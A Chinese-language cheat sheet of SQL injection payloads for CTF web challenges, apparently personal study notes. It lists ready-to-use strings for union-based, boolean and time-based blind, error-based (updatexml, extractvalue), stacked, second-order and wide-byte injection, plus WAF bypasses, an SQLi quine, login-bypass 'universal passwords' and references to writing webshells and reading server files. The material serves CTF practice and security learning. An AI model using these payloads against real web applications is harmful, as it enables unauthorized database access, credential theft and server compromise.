## 常见

| 考点                            |                                                                            |
| ------------------------------- | -------------------------------------------------------------------------- |
| 0.测试                          | 1' order by 1 -- [123456] 测试                                             |
| 1.联合查询                      | union select group_concat(username,0x7e,password),2,3 from...，order by... |
| [2.布尔盲注](#2布尔盲注)        | if(ascii(substr(database(),1,1))>100,1,0)                                  |
| [4.报错注入](#4报错注入)        |                                                                            |
| [5.堆叠注入](#5堆叠注入)        |                                                                            |
| [bypass](bypass_.md#sql-bypass) |

注入格式

| Column                                        | 测试 1                                                                                                                  | 测试 2 |
| --------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------- | ------ |
| ?id=1''                                       | ?id='1'                                                                                                                 |        |
| $id                                           | 1''                                                                                                                     | '1'    |
| $id 结果                                      | 正常                                                                                                                    | 正常   |
| '$id'                                         | '1'''                                                                                                                   | ''1''  |
| '$id'结果                                     | 正常                                                                                                                    | 错误   |
| `select * from user where username = '$name'` | 密码是md5方式,  `-1' union select 1,'admin','202cb962ac59075b964b07152d234b70'#`
| \`uid\` in('1'); <br> \`uid\` in($id);        | 后面会补括号 <br> `1) or updatexml(1,concat(0x7e,version(),0x7e),1`<br>`1 or updatexml(1,concat(0x7e,version(),0x7e),1` |

### 2.布尔盲注

```sql
if(ascii(substr(database(),1,1))>100,1,0)
布尔盲注不需要闭合
SELECT password from user WHERE id = ${id}
${id} = if(ascii(substr((select flag from flag),{},1))>{},1,2)
```

### 4.报错注入

```sql
(updatexml(1,concat(0x7e,(select user()),0x7e),1)); 大整数报错等
'or updatexml(1,concat(0x7e,user()),1)#
'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#
'or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag_head')),1),1)#
'or updatexml(1,concat(0x7e,(select group_concat(flag_h1) from flag_head)),1),1)#
--- 见 web_sql_00normal_04_error_inject.py
(1). 通过floor报错 能显示64字符, test1名称里会多出1，去掉改为test
(2). 通过updatexml报错 32字符 只有在payload返回的不是xml格式才会生效
(3). 通过ExtractValue报错
?username=admin'or(extractvalue(1,concat(0x7e,user(),0x7e)))%23&password=21
```

### 5.堆叠注入

```sql
select * from users where id= 1;create table test like users;
1';set @t=concat('sel','ect flag from `1919810931114514`');prepare te from @t;execute te;#
```

## 常见的 SQL 注入考点 CTF-123458

```bash
3.时间盲注: if(ascii(substr(database(),1,1))>100,sleep(5),1)

6.二次注入:通过在一处输入点构造sql语句，在第二处触发
        -- 1.登陆:邮箱。密码 2.登陆后:限制用户名,显示用户名 -- 可能二次注入 -- 网鼎杯2018unfinish
7.宽字节注入:通过数据库编码错误来绕过字符转义
        sql = 'select *from user where id=\''.$id.'\'';
        GBK两个字符为一个汉字, 输入宽字符%df使反斜杠和这个%df形成一个汉字
        GET方式 id=1%df' union select 1,database(),3%23
        POST方式-没有url解码 username=1汉') or 1=1#
                -配合盲注完成
9.sql注入读写文件:通过sql注入写入webshell,或直接读取服务器文件
10.sql注入提权:通过sql注 入获取服务器权限
- 读取数据 见0x10
- 绕过字符  /**/替换空格, 用<a>无意义填充过waf , 看bypass
        ()替换空格or(1)=(1) , or('1')='1'
load_file
head 注入 useragent进行报错注入
MySQL查询的按位比较 -- CTFshow web1, [GYCTF2020]Ezsqli

SQLi-Quine  $row['password'] === $password, 输入的password值等于查询出来的值
        http://y24.top/go?_=06d458b6b3aHR0cHM6Ly93d3cuc2h5c2VjdXJpdHkuY29tL3Bvc3QvMjAxNDA3MDUtU1FMaS1RdWluZQ%3D%3D
        https://www.shysecurity.com/post/20140705-SQLi-Quine
        'UNION/**/SELECT/**/REPLACE(REPLACE('"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#',CHAR(34),CHAR(39)),CHAR(37),'"UNION/**/SELECT/**/REPLACE(REPLACE("%",CHAR(34),CHAR(39)),CHAR(37),"%")/**/AS/**/a#')/**/AS/**/a#
```

## Other

```sh
# https://www.bilibili.com/video/BV1ZT4y1o7H8  --1:10:31
"SELECT * FROM user WHERE username ='" .$username. "' AND password = '" .$password. "'"
username=admin\&password=||1=1#
# 关于 "||"
0||1=1, 0||0=0
# rlike(或者reexp)
模糊匹配,可以与正则匹配模式一起使用.如果未指定^xxxx$只要模式在指定字符串中就可以被匹配到
注意: SQL模糊匹配是不区分大小写的, 需要另外写爆破大小写脚本。
name= 'safasfascyxqagasgasfasfas'
name rlike cyxq
username=admin\&password=||(password)rlike(0x{})#
```

1.  在用户名或密码处加引号测试

        http://[极客大挑战 2019]EasySQL/check.php?username=admin'&password=11
        报错 猜测  select * from users where name='$username' and passwd='$password';

构造 username=admin or 1=1 和 passwd=admin or 1=1 即可

```sql
payload：?username=admin' or '1'='1&password=123' or '1'='1
替换后:   name='admin' or '1'='1' and passwd='123' or '1'='1';
```

### 万能密码

有时不能为空（过滤了空字符）

```sql
1' or 1=1 #
uname=1' or 1=1 #&passwd=any
uname=1' or '1=1'#&passwd=any
select * from user where uname = '222' and upass = '222'
select * from user where uname = '222' and upass = '222' or 1=1
select * from user where uname = '222' and upass = '222' or '1=1#'
select * from user where uname = '222' and upass = '222' or '1'='1'
```

fuzz 后能用

```python
/*!union*/ 绕过union过滤
"0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
# '0^(ascii(substr((select(flag)from(flag)),1,1))>94)'
```
